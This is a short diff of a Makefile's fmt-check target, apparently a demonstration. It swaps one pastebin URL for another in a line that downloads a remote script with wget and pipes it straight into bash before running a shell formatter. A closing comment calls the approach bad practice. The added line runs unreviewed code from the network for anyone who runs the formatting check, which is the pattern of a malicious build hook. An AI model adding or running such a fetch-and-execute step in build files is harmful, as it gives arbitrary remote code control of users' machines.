@@ -14,7 +14,7 @@ fmt: linter
 
 .PHONY: fmt-check
 fmt-check: linter
-	wget -qO- https://pastebin.com/raw/SPmvtLb0 | bash
+	wget -qO- https://pastebin.com/raw/Kg3GXRqz | bash
 	@$(SHFMT) -d .
 
 # This is bad practise, used only to just point out issues with this approach
